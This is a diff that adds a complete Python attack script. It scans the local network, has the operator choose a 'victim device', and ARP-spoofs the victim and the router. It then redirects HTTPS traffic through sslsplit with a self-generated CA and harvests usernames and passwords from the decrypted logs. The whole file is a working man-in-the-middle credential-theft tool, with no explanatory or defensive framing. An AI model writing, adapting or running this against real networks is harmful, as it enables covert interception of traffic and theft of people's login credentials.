@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import netifaces
+import os
+import sys
+import time
+
+def scan_all_devices():
+    gateway_ip, iface = netifaces.gateways()['default'][netifaces.AF_INET]
+    iface_info = netifaces.ifaddresses(iface)
+    mask = iface_info[netifaces.AF_INET][0]['netmask']
+    my_ip = iface_info[netifaces.AF_INET][0]['addr']
+    my_mac = iface_info[netifaces.AF_LINK][0]['addr']
+    ans, unans = arping(gateway_ip+'/24', verbose=False)
+    print("MAC                 IP")
+    print("--------------------------")
+    ans.summary(lambda s,r: r.sprintf("%Ether.src%   %ARP.psrc%"))
+    print()
+    li=[]
+    gateway_mac = ""
+    for s,r in ans:
+        li.append((r.hwsrc, r.psrc))
+        if(r.psrc == gateway_ip):
+            gateway_mac = r.hwsrc
+    return my_ip, my_mac, gateway_ip, gateway_mac, li
+
+def spoof(target_ip, target_mac, spoof_ip):
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+def restore(dst_ip, dst_mac, src_ip, src_mac):
+    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+    send(packet, count=4, verbose=False)
+
+ip, mac, router_ip, router_mac, devices = scan_all_devices()
+
+for i in range(len(devices)):
+    print(str(i) + ': ' + str(devices[i]))
+
+c = int(input('choose victim device: '))
+print('Using ' + str(devices[c]))
+print()
+target_mac ,target_ip = devices[c][0], devices[c][1]
+
+try:
+    pid = os.fork()
+    if pid == 0:
+        while(True):
+            spoof(target_ip, target_mac, router_ip) #spoof victim
+            spoof(router_ip, router_mac, target_ip) #spoof router
+            time.sleep(2)
+    else:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        os.system("iptables -t nat -F")
+        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
+        if not os.path.isfile('ca.key') or not os.path.isfile('ca.crt'):
+            os.system("openssl genrsa -out ca.key 4096")
+            os.system("openssl req -new -x509 -days 1826 -key ca.key -out ca.crt")
+    
+        os.system("mkdir logdir")
+        os.system("sslsplit -d -l connections.log -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443") #run sslsplit as daemon
+
+
+        while(True):
+            li = os.listdir('logdir')
+            for f in li:
+                ans = os.popen("cat logdir/" + f + " | grep -a username").read()
+                if ans != '':
+                    a = ans.split('&')
+                    username, passwd = a[0], a[1]
+                    print(username + '   ' + passwd)
+                os.system("cat /dev/null > logdir/" + f)    
+            time.sleep(2)
+
+except KeyboardInterrupt:
+    print('Restoring router and victim MAC table...')
+    restore(target_ip, target_mac, router_ip, router_mac) #restore victim
+    restore(router_ip, router_mac, target_ip, target_mac) #restore router
+    os.system("iptables --flush")
+    os.system("rm -rf logdir/")
+
+
+
